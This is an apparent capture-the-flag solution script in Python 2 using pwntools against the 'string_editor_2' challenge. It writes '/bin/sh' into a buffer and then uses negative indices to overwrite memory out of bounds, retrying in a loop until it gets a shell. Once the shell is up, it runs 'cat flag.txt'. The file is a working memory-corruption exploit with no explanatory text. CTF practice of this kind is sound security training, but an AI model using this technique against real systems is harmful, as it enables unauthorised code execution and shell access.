from pwn import *
count =0
while True:
    p =remote('chal.imaginaryctf.org', 42005)
    print count
    count +=1
    # p = process('./string_editor_2')
    # pid = gdb.attach(p,gdbscript='b * del')
    bin_sh ='/bin/sh\0'
    for i in range(8):
        p.sendlineafter(')\n',str(i))
        p.sendlineafter('index?\n',chr(ord(bin_sh[i])))

    p.sendlineafter(')\n','-104')
    p.sendlineafter('index?\n', chr(0x10))

    p.sendlineafter(')\n','-103')
    p.sendlineafter('index?\n', chr(0x14))

    p.sendlineafter(')\n','-102')
    p.sendlineafter('index?\n', chr(0x57))

    p.sendlineafter(')\n','15')
    p.sendlineafter('Exit\n','2')
    # p.interactive()
    p.sendline('cat flag.txt')
    try:
        a= p.recvline()
        if 'ctf' in a:
            print "flag:",a
            break
    except Exception as e:
        p.close()
        p.shutdown()
